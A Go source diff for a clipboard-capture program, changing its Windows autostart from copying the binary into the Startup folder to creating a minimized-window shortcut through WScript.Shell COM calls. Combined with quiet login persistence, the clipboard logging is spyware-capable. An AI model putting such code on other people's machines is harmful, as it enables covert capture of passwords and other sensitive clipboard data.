@@ -2,16 +2,15 @@ package main
 
 import (
 	"fmt"
-	"io"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"runtime"
 	"time"
 
-	//"syscall"
-
 	"github.com/atotto/clipboard"
+	"github.com/go-ole/go-ole"
+	"github.com/go-ole/go-ole/oleutil"
 )
 
 func main() {
@@ -76,7 +75,7 @@ func storeClipboard(path, data string) {
 	check(err)
 }
 
-// setupPersistence copies the binary to the Windows Startup folder for autorun at login
+// setupPersistence ensures the Startup folder exists and creates a shortcut to the binary
 func setupPersistence() error {
 	appData := os.Getenv("APPDATA")
 	startupDir := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
@@ -84,32 +83,42 @@ func setupPersistence() error {
 		err = os.MkdirAll(startupDir, 0755)
 		check(err)
 	}
-
-	binaryPath, err := os.Executable()
+	exePath, err := os.Executable()
 	check(err)
-	binaryName := filepath.Base(binaryPath)
-	targetPath := filepath.Join(startupDir, binaryName)
 
-	// Copy binary if not already present
-	if _, err := os.Stat(targetPath); os.IsNotExist(err) {
-		err := copyBinary(binaryPath, targetPath)
-		check(err)
-	}
-	return nil
+	shortcutPath := filepath.Join(startupDir, "capture-clipboard.lnk")
+	return createShortcut(exePath, shortcutPath)
 }
 
-// copyBinary copies a file from src to dst with 0755 permissions
-func copyBinary(src, dst string) error {
-	in, err := os.Open(src)
-	check(err)
-	defer in.Close()
+// createShortcut creates a .lnk shortcut in the Startup folder pointing to exePath
+func createShortcut(exePath, shortcutPath string) error {
+	ole.CoInitialize(0)
+	defer ole.CoUninitialize()
 
-	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY, 0755)
+	shellObj, err := oleutil.CreateObject("WScript.Shell")
 	check(err)
-	defer out.Close()
+	defer shellObj.Release()
 
-	_, err = io.Copy(out, in)
+	shell, err := shellObj.QueryInterface(ole.IID_IDispatch)
 	check(err)
+	defer shell.Release()
+
+	shortcut, err := oleutil.CallMethod(shell, "CreateShortcut", shortcutPath)
+	check(err)
+	defer shortcut.Clear()
+
+	sc := shortcut.ToIDispatch()
+	_, err = oleutil.PutProperty(sc, "TargetPath", exePath)
+	check(err)
+	_, err = oleutil.PutProperty(sc, "WorkingDirectory", filepath.Dir(exePath))
+	check(err)
+	_, err = oleutil.PutProperty(sc, "WindowStyle", 7)
+	check(err)
+	_, err = oleutil.PutProperty(sc, "Description", "Clipboard Capture")
+	check(err)
+	_, err = oleutil.CallMethod(sc, "Save")
+	check(err)
+
 	return nil
 }
 
